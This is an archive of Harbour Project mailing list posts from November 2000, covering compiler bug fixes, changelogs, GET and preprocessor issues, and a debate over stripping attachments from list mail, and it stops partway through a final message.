From harbour@lists.harbour-project.org  Wed Nov  1 07:14:02 2000
Date: Wed Nov  1 07:14:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-10-31 20:56 GMT+1 JFL (Mafact) <jfl@mafact.com>

<PRE>Hi Maurilio

&gt;<i> no changes here after your last changelog entry:
</I>
Yes, I'm aware of that, don't worry, I'm currently working on this 
problem. 
 
&gt;<i> Exception c0000005 at address 4b6b5
</I>&gt;<i> Called from TCLASS:CREATE(166)
</I>&gt;<i> Called from TSCEGLIQUERY(20)
</I>&gt;<i> Called from TSQLEDITOR:SELEZIONAQUERY(143)
</I>&gt;<i> Called from TSQLEDITOR:KEYBOARDHOOK(115)
</I>&gt;<i> Called from TSQLEDITOR:EDIT(896)
</I>&gt;<i> Called from MAIN(64)
</I>&gt;<i> 
</I>&gt;<i> Process terminated by SIGSEGV
</I>&gt;<i> core dumped
</I>&gt;<i> SYS1808:
</I>&gt;<i> Il processo =E8 terminato. Il codice per la diagnostica
</I>&gt;<i> software (codice dell'errore) =E8  0005.
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> regards.
</I>&gt;<i> 
</I>&gt;<i> PS. Line numbers are different since here at home I've a slightly
</I>&gt;<i> different version, SelezionaQuery() is a method of TSQLEditor and not a
</I>&gt;<i> function.
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> JF Lefebvre ha scritto:
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; 2000-10-31 20:56 GMT+1 JFL (Mafact) &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
</I>&gt;<i> &gt;    * source/vm/classes.c
</I>&gt;<i> &gt;      * Bug correction where __OBJHASMSG() returned True when
</I>&gt;<i> &gt;        no msg exist in some case
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Best regards,
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; J. Lefebvre,
</I>&gt;<i> &gt; Bruxelles,
</I>&gt;<i> &gt; Belgium
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Reply to &lt;<A HREF="mailto:jfl@wanadoo.be">jfl@wanadoo.be</A>&gt;
</I>&gt;<i> &gt; if you expect your message to reach me within the WE.
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> -- 
</I>&gt;<i> 
</I>&gt;<i>  __________                   
</I>&gt;<i> |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>&gt;<i> |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium

Reply to &lt;<A HREF="mailto:jfl@wanadoo.be">jfl@wanadoo.be</A>&gt;
if you expect your message to reach me within the WE.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 07:32:02 2000
Date: Wed Nov  1 07:32:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-01 04:25 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-01 04:25 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;

   * source/compiler/harbour.slx
     + Added support for pseudo function _GET_(...)
   * source/compiler/harbour.sly
     + Added support for pseudo function _GET_(...) to be converted into
appropriate __GET(...) or __GETA(...)
   * source/rtl/tget.prg
     + Added __GETA() to correctly support early binding of Array Element
Index of GET
   * tests/testread.prg
     + Added code to test correct (early) binding of Array Element Index of
GET

/* This is indeed a hack. Upon approval of the group (Antonio?, Ryszard?)
and some extra time, I will provide
   same for Flex. */


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 07:37:02 2000
Date: Wed Nov  1 07:37:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John,

I did fix this bug, using very similar hack to the one apparently done in
Clipper. Please note this proposed fix currently available in SimpLex
version only.

You may review testread.prg to see it working.

Ron

&gt;<i> [To All]
</I>&gt;<i>
</I>&gt;<i> I think @ ... GET with an array element isn't working the way Clipper
</I>&gt;<i> does.  Clipper has a weird hack _GET_() which can create a kind of
</I>&gt;<i> detached local for an array element, but Harbour's _GET_() doesn't
</I>&gt;<i> do that - it creates a code block instead, and that matters in this
</I>&gt;<i> case.  I wish I had a fix!  Here's a (meaningless) sample:
</I>&gt;<i>
</I>&gt;<i> function main()
</I>&gt;<i> local	i, j, arr[5], GetList := {}
</I>&gt;<i>
</I>&gt;<i> for i = 1 to 5
</I>&gt;<i> 	arr[i] = ltrim(str(i))
</I>&gt;<i>
</I>&gt;<i> 	@ i, 1 get arr[i]
</I>&gt;<i> next i
</I>&gt;<i> // NOTE: i is *not* re-used!
</I>&gt;<i>
</I>&gt;<i> for j = 1 to 5
</I>&gt;<i> 	? GetList[j]:VarGet()	// OK in Clipper; runtime error in Harbour
</I>&gt;<i> next j
</I>&gt;<i> return 0
</I>&gt;<i>
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 07:53:02 2000
Date: Wed Nov  1 07:53:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Ron,

Does it work if you have multiple arrays and 
objects datas also ?

i.e.:

   a[ b ][ c ]:d[ e ]:f:g[ h ][ i ]


Antonio


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 13:58:01 2000
Date: Wed Nov  1 13:58:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] rdd SkipFilter

<PRE>Harrier:

&gt;<i>     skipFilter() skips to the next visible record, obeying filter and
</I>scope
&gt;<i> as
</I>&gt;<i>     well as the deleted row settings.  skipFilter() is provided for skip()
</I>&gt;<i>     optimization.
</I>&gt;<i>
</I>&gt;<i> I think this means exacly what you say.
</I>
Unfortunately NO!  The text is a bit ambiguous.
The problem is, our skipFilter( 1 ) will ONLY &quot;skips to the next visible
record&quot; IF it's on a &quot;invisible&quot; record!

As written I would expect it instead to skip FROM a current GOOD record as
well. This is a critical difference!
That's why it would be great to find someone with experience writing for
clipper's to confirm the expected behavior...

Brian




</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 14:14:02 2000
Date: Wed Nov  1 14:14:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Antonio,

Clipper does _not_ handle an Array Index which involves object data like it
does Array Index alone. When object data is involved the standard __GET(...)
is used, which means it has the same problem as we did have.

However I still have to add a rule to support _GET_ involving object data.
When quickly looking at it I had few reduce/reduce conflicts and I didn't
have time to check it yet. I might need assistance resolving these
reduce/reduce conflicts, the conflict has to do with separating between
Array Index in itself as expressed by GetArayIndex and ArrayIndex in the
context of ArrayAt which is used by ObjectData (Ryszard?).

(yes our fix does support multi dimensional array index)

Ron

&gt;<i> Ron,
</I>&gt;<i>
</I>&gt;<i> Does it work if you have multiple arrays and
</I>&gt;<i> objects datas also ?
</I>&gt;<i>
</I>&gt;<i> i.e.:
</I>&gt;<i>
</I>&gt;<i>    a[ b ][ c ]:d[ e ]:f:g[ h ][ i ]
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Antonio
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 14:47:02 2000
Date: Wed Nov  1 14:47:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Documentation Error

<PRE>Edison



&gt;<i> In this file doc\en\rddmisc.txt
</I>&gt;<i> say this:
</I>Thanks for the info.I´ll fix this

Regards

Luiz Rafael Culik

Ps: you send send the spanish translated doc direct to me so i can upload
then



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 15:09:03 2000
Date: Wed Nov  1 15:09:03 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Ideas about mailing list features.

<PRE>&gt;<i> After researching what I can do to messages coming into our
</I>&gt;<i> mailing list, I would like to propose a couple of things.
</I>&gt;<i>
</I>&gt;<i> 1. I can strip MIME attachments.
</I>&gt;<i>
</I>&gt;<i> Pro: Viruses are stripped instead of being distributed
</I>&gt;<i> Con: File Attachments are stripped, requiring an alternate method
</I>&gt;<i> of file exchange.
</I>&gt;<i>
</I>&gt;<i> 2. I can limit the overall size of mail messages
</I>&gt;<i>
</I>&gt;<i> Pro: No more large files in our email boxes.
</I>&gt;<i> Con: No more large text emails.
</I>&gt;<i>
</I>&gt;<i> Personally, I would very much like to limit mail sizes to around
</I>&gt;<i> 40k, and strip all mime attachments so we don't distribute viruses
</I>&gt;<i> accidently.
</I>&gt;<i>
</I>&gt;<i> This means that if someone who doesn't have CVS access wants
</I>&gt;<i> to submit files for CVS that they will have to be sent to someone
</I>&gt;<i> personally, not to the list. Is that a big deal?
</I>&gt;<i>
</I>&gt;<i> Opinions?
</I>
Although I understand the idea, I personally don't like it. For people
like me, who don't have CVS write access, sending propositions to
the list was a very good idea (many people could look at it at once).
Also there were many times stated on this list that propositions
should be first sent to the list to review them by core developers.
And finally there are still places in this world where internet access
is not very easy - just like for me - so sendig posts with attachments
is a simplest and quickest way.

Regards
Marek Paliwoda




</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 15:10:02 2000
Date: Wed Nov  1 15:10:02 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Result from this test Needed

<PRE>This is a multi-part message in MIME format.

--Boundary_(ID_pYsLn7UEAH7HAu/ge5dNAQ)
Content-type: text/plain; charset=iso-8859-1
Content-transfer-encoding: 7BIT

&gt;<i> Marek
</I>&gt;<i> 
</I>&gt;<i> &gt; These are results from linux 2.2.14, gtsln
</I>&gt;<i> 
</I>&gt;<i> Many thanks
</I>&gt;<i> 
</I>&gt;<i> Regards
</I>&gt;<i> 
</I>&gt;<i> Luiz Rafael Culik
</I>
Oops !!!

Accidentally I sent You results from gtcrs (curses based) gt driver, 
but I stated in a post that they are from gtsln.  
I am really sorry, Luiz !!

gtsln results are attached to this post.

Sorry again
Marek Paliwoda



--Boundary_(ID_pYsLn7UEAH7HAu/ge5dNAQ)
Content-type: application/octet-stream; name=result.slang
Content-disposition: attachment; filename=result.slang
Content-transfer-encoding: quoted-printable

Os is Linux 2.4.0-test7=0A=
Compiler GNU C 2.91=0A=
Version is Harbour 0.35f Intl. (Build 35)  (2000.09.28)=0A=
Current Color set is W/N,N/W,N/N,N/N,N/W=0A=
Current Screeen Row         0=0A=
Current Screeen Col         0=0A=
Current Screeen Row        10=0A=
Current Screeen Col        20=0A=
Max Row is         28=0A=
Max Col is         79=0A=
Printer Row is set to          0=0A=
Printer Col is set to          0=0A=
Now Printer Row is set to          5=0A=
Now Printer Col is set to          5=0A=

--Boundary_(ID_pYsLn7UEAH7HAu/ge5dNAQ)--

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 18:03:03 2000
Date: Wed Nov  1 18:03:03 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Result from this test Needed

<PRE>Marek



&gt;<i> 
</I>&gt;<i> Accidentally I sent You results from gtcrs (curses based) gt driver, 
</I>&gt;<i> but I stated in a post that they are from gtsln.  
</I>&gt;<i> I am really sorry, Luiz !!
</I>&gt;<i> 
</I>&gt;<i> gtsln results are attached to this post.
</I>
No problem. Thanks my friend

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 18:04:02 2000
Date: Wed Nov  1 18:04:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-01 15:00 UTC+0800

<PRE>2000-11-01 15:00 UTC+0800 Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
   * contrib/rdd_ads/ads1.c
   * contrib/rdd_ads/rddads.h
   * include/hbrddcdx.h
   * include/hbrdddbf.h
   * include/hbrdddel.h
   * include/hbrddsdf.h
   * include/hbrddwrk.h
   * source/rdd/dbcmd.c
   * source/rdd/dbf1.c
   * source/rdd/delim1.c
   * source/rdd/sdf1.c
   * source/rdd/dbfcdx/dbfcdx1.c
   * source/rdd/dbfntx/dbfntx1.c
      * Global replaces to fix RecAll/Recall and ReadOnly/Readonly
        inconsistencies.

        RDD AUTHORS !!!!  This may break your code!
        I did several tests and all seems fine.

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 20:12:02 2000
Date: Wed Nov  1 20:12:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] PP Problem with dbClearRel

<PRE>Alexander:
I get Undefined External '_HB_FUN_DBCLEARREL' when setting SCOPED relations,
or when calling dbClearRel() directly.

There are strange things happening in the PPO!
Code:
   SET RELATION TO Matters-&gt;U_ID INTO MattNote SCOPED
PPO:  &gt;&gt;Notice it's NOT dbClearRelation spelled out
   if (!.F. ) ; dbClearRel() ; end ;
ordSetRelation(&quot;MattNote&quot;,{||Matters-&gt;U_ID},&quot;Matters-&gt;U_ID&quot; )

Code:
   SET RELATION TO
PPO:  &gt;&gt; Notice spelled out
   dbClearRelation()

Code:
   SET RELATION TO XREF-&gt;U_ID3 INTO Matters   // NOT Scoped
PPO:  &gt;&gt; Notice spelled out
   if (!.F. ) ; dbClearRelation() ; end ;
dbSetRelation(&quot;Matters&quot;,{||XREF-&gt;U_ID3},&quot;XREF-&gt;U_ID3&quot;,.F. )

Is it the preprocessor's responsibility to resolve 10-letter issues?  I also
have explicit calls to dbClearRel() that do not get expanded (should they?)


Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 20:34:02 2000
Date: Wed Nov  1 20:34:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-01 17:25 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-01 17:25 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;

   * source/compiler/harbour.sly
     ! Optimized _GET_ support.
     + Added support for GET of ObjectData and ObjectData ArrayIndex.

   * source/rtl/tget.prg
     + Added method ParsePict() and logic to support dynamic modification of
the picture by altering :Picture as in Clipper.

   * tests/testread.prg
     + Added line to demonstrate GET of ObjectData and dynamic modification
of a PICTURE clause.


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  1 20:37:02 2000
Date: Wed Nov  1 20:37:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Antonio,

Done :-)

Ron

&gt;<i> Ron,
</I>&gt;<i> 
</I>&gt;<i> Does it work if you have multiple arrays and 
</I>&gt;<i> objects datas also ?
</I>&gt;<i> 
</I>&gt;<i> i.e.:
</I>&gt;<i> 
</I>&gt;<i>    a[ b ][ c ]:d[ e ]:f:g[ h ][ i ]
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> Antonio
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 01:41:01 2000
Date: Thu Nov  2 01:41:01 2000
From: Alexander S.Kresin harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>On 02.11.2000 4:10, Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt; wrote:

BH&gt; Alexander:
BH&gt; I get Undefined External '_HB_FUN_DBCLEARREL' when setting SCOPED relations,
BH&gt; or when calling dbClearRel() directly.

BH&gt; There are strange things happening in the PPO!
BH&gt; Code:
BH&gt;    SET RELATION TO Matters-&gt;U_ID INTO MattNote SCOPED
PPO:  &gt;&gt;&gt;Notice it's NOT dbClearRelation spelled out
BH&gt;    if (!.F. ) ; dbClearRel() ; end ;
BH&gt; ordSetRelation(&quot;MattNote&quot;,{||Matters-&gt;U_ID},&quot;Matters-&gt;U_ID&quot; )

  Are you sure that you haven't some #include files there with SET
  RELATION ... redefined ?
  I can't reproduce your result, for the above line I have following:

  if (!.F. ) ; dbClearRelation() ; end ; dbSetRelation(&quot;MattNote&quot;,{||Matters-&gt;U_ID},&quot;Matters-&gt;U_ID&quot;,.T. )

  which is right.

Best regards,
 Alexander
<A HREF="http://members.xoom.com/alkresin/">http://members.xoom.com/alkresin/</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 01:41:07 2000
Date: Thu Nov  2 01:41:07 2000
From: Alexander S.Kresin harbour@lists.harbour-project.org
Subject: [Harbour] Re: Ideas about mailing list features.

<PRE>On 31.10.2000 8:20, Phil Barnett &lt;<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>&gt; wrote:

PB&gt; After researching what I can do to messages coming into our 
PB&gt; mailing list, I would like to propose a couple of things.

PB&gt; 1. I can strip MIME attachments.

PB&gt; Pro: Viruses are stripped instead of being distributed
PB&gt; Con: File Attachments are stripped, requiring an alternate method 
PB&gt; of file exchange.

 I think that this isn't a good idea. Sometimes we need to
 send files - test results, propositions, etc. and sending it with
 the mail is a most convenient way.
 If someone runs all .exe's, .vbs's, etc. attached, this is his
 problem. An old French saw says:
 'If someone is died, it's for a long tome, if he is fool, it's
 forever.'


Best regards,
 Alexander
<A HREF="http://members.xoom.com/alkresin/">http://members.xoom.com/alkresin/</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 03:14:02 2000
Date: Thu Nov  2 03:14:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Alexander:
I can't find any other headers affecting this.

But either way, I should be able to call dbClearRel(), shouldn't I?
It comes up as undefined each time, but dbClearRelation() works.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Alexander S.Kresin&quot; &lt;<A HREF="mailto:alex@belacy.belgorod.su">alex@belacy.belgorod.su</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Wednesday, November 01, 2000 10:22 pm
Subject: [Harbour] Re: PP Problem with dbClearRel


&gt;<i> On 02.11.2000 4:10, Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt; wrote:
</I>&gt;<i>
</I>&gt;<i> BH&gt; Alexander:
</I>&gt;<i> BH&gt; I get Undefined External '_HB_FUN_DBCLEARREL' when setting SCOPED
</I>relations,
&gt;<i> BH&gt; or when calling dbClearRel() directly.
</I>&gt;<i>
</I>&gt;<i> BH&gt; There are strange things happening in the PPO!
</I>&gt;<i> BH&gt; Code:
</I>&gt;<i> BH&gt;    SET RELATION TO Matters-&gt;U_ID INTO MattNote SCOPED
</I>&gt;<i> PPO:  &gt;&gt;&gt;Notice it's NOT dbClearRelation spelled out
</I>&gt;<i> BH&gt;    if (!.F. ) ; dbClearRel() ; end ;
</I>&gt;<i> BH&gt; ordSetRelation(&quot;MattNote&quot;,{||Matters-&gt;U_ID},&quot;Matters-&gt;U_ID&quot; )
</I>&gt;<i>
</I>&gt;<i>   Are you sure that you haven't some #include files there with SET
</I>&gt;<i>   RELATION ... redefined ?
</I>&gt;<i>   I can't reproduce your result, for the above line I have following:
</I>&gt;<i>
</I>&gt;<i>   if (!.F. ) ; dbClearRelation() ; end ;
</I>dbSetRelation(&quot;MattNote&quot;,{||Matters-&gt;U_ID},&quot;Matters-&gt;U_ID&quot;,.T. )
&gt;<i>
</I>&gt;<i>   which is right.
</I>&gt;<i>
</I>&gt;<i> Best regards,
</I>&gt;<i>  Alexander
</I>&gt;<i> <A HREF="http://members.xoom.com/alkresin/">http://members.xoom.com/alkresin/</A>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 04:15:04 2000
Date: Thu Nov  2 04:15:04 2000
From: =?iso-8859-1?Q?Ignacio_Ortiz_de_Zu=F1iga?= harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Ron,

Great job!! BTW I think it will be great if we have a function like
AddressOf(xVar) which returns a pointer to hb_item and one more SetGet
function to retrieve and change his value, for example
pHbItemSetGet(cPointer, xNewValue) --&gt; xOldValue

With this two functions we can achieve all the functionality needed with no
need to parse any source code.

Regards,

Ignacio Ortiz
Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
http: www.ozs.com

-----Mensaje original-----
De: <A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>
[mailto:<A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>]En nombre de Ron Pinkas
Enviado el: jueves, 02 de noviembre de 2000 2:38
Para: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
Asunto: RE: [Harbour] bug in GET


Antonio,

Done :-)

Ron

&gt;<i> Ron,
</I>&gt;<i>
</I>&gt;<i> Does it work if you have multiple arrays and
</I>&gt;<i> objects datas also ?
</I>&gt;<i>
</I>&gt;<i> i.e.:
</I>&gt;<i>
</I>&gt;<i>    a[ b ][ c ]:d[ e ]:f:g[ h ][ i ]
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Antonio
</I>
_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 04:52:02 2000
Date: Thu Nov  2 04:52:02 2000
From: Alexander S.Kresin harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>On 02.11.2000 11:12, Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt; wrote:

BH&gt; Alexander:
BH&gt; I can't find any other headers affecting this.

 Try co compile/preprocess a file with the only line - which is
 preprocessed wrong.

BH&gt; But either way, I should be able to call dbClearRel(), shouldn't I?
BH&gt; It comes up as undefined each time, but dbClearRelation() works.

 Yes, I'm sure we should be Clipper compatible here and this function
 should be called dbClearRel(), not dbClearRelation(). We need to change
 it's name in dbcmd.c and appropriate preprocess rule in pptable.c .


Best regards,
 Alexander
<A HREF="http://members.xoom.com/alkresin/">http://members.xoom.com/alkresin/</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 05:05:07 2000
Date: Thu Nov  2 05:05:07 2000
From: =?iso-8859-1?Q?Gustavo_A._Gonz=E1lez_M.?= harbour@lists.harbour-project.org
Subject: [Harbour] SQL

<PRE>Hi.

I am looking in a page that appear like SQL in open source (like harbour). I
think that may be usefull for harbour. And is free.

If interested....

<A HREF="http://www.mysql.com/">http://www.mysql.com/</A>


***********************************
Gustavo A. González M.
<A HREF="mailto:gonzalezgustavo@cantv.net">gonzalezgustavo@cantv.net</A>
Caracas - Venezuela
***********************************


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 05:38:02 2000
Date: Thu Nov  2 05:38:02 2000
From: =?big5?B?ufml1g==?= harbour@lists.harbour-project.org
Subject: [Harbour] testbrw.prg Compiler error!!

<PRE>Hello!!
I compiler testbrw.prg from RedHat 6.2!!
----------------------------------------------------------
[<A HREF="mailto:ssbbs@MySQL">ssbbs@MySQL</A> harbour]# ./make_gnu.sh all
----------------------------------------------------------
gcc -Wall -g -otestbrdb
estbrdb.o  -L../../../source/debug/linux/gcc  -L../../p
../../../source/compiler/linux/gcc/harbour
../../testbrw.prg  -n -q0 -w -es2 -ge
../../testbrw.prg(131) Warning W0001  Ambiguous reference: 'NTMPROW'
../../testbrw.prg(132) Warning W0001  Ambiguous reference: 'NTMPCOL'
../../testbrw.prg(134) Warning W0001  Ambiguous reference: 'NTMPROW'
../../testbrw.prg(134) Warning W0001  Ambiguous reference: 'NTMPCOL'

No code generated.
make[2]: *** [testbrw.c] Error 1
make[2]: Leaving directory `/usr/local/harbour/tests/linux/gcc'
make[1]: *** [^^^d^e^s^c^e^n^d^^^] Error 2
make[1]: Leaving directory `/usr/local/harbour/tests'
make: *** [first] Error 2



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 06:39:02 2000
Date: Thu Nov  2 06:39:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] 2000-10-31 20:56 GMT+1 JFL (Mafact) <jfl@mafact.com>

<PRE>Maurilio Longo wrote:

&gt;<i> no changes here after your last changelog entry:
</I>
  Please wait a moment. I am correcting now the reference counting
issues that can cause some random GPFs. There is a problem with too
early deallocation of values stored in detached local variables.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 07:18:01 2000
Date: Thu Nov  2 07:18:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] SQL

<PRE>Hi,

look at /contrib/mysql :-)

regards.

&quot;Gustavo A. González M.&quot; ha scritto:
&gt;<i> 
</I>&gt;<i> Hi.
</I>&gt;<i> 
</I>&gt;<i> I am looking in a page that appear like SQL in open source (like harbour). I
</I>&gt;<i> think that may be usefull for harbour. And is free.
</I>&gt;<i> 
</I>&gt;<i> If interested....
</I>&gt;<i> 
</I>&gt;<i> <A HREF="http://www.mysql.com/">http://www.mysql.com/</A>
</I>&gt;<i> 
</I>&gt;<i> ***********************************
</I>&gt;<i> Gustavo A. González M.
</I>&gt;<i> <A HREF="mailto:gonzalezgustavo@cantv.net">gonzalezgustavo@cantv.net</A>
</I>&gt;<i> Caracas - Venezuela
</I>&gt;<i> ***********************************
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 
 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 07:21:02 2000
Date: Thu Nov  2 07:21:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] 2000-10-31 20:56 GMT+1 JFL (Mafact) <jfl@mafact.com>

<PRE>Hi,

I thought it was a problem with class creation code.

regards.

rglab ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio Longo wrote:
</I>&gt;<i> 
</I>&gt;<i> &gt; no changes here after your last changelog entry:
</I>&gt;<i> 
</I>&gt;<i>   Please wait a moment. I am correcting now the reference counting
</I>&gt;<i> issues that can cause some random GPFs. There is a problem with too
</I>&gt;<i> early deallocation of values stored in detached local variables.
</I>&gt;<i> 
</I>&gt;<i> Regards, Ryszard
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 
 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 07:59:02 2000
Date: Thu Nov  2 07:59:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] rdd SkipFilter

<PRE>And the Cl*pper NG about dbSkip() doesn't clarify much, iether:
________
Description

    skip() skips count number of rows (count may be negative, indicating
    reverse traversal), obeying filter and scope conditions.  This method is
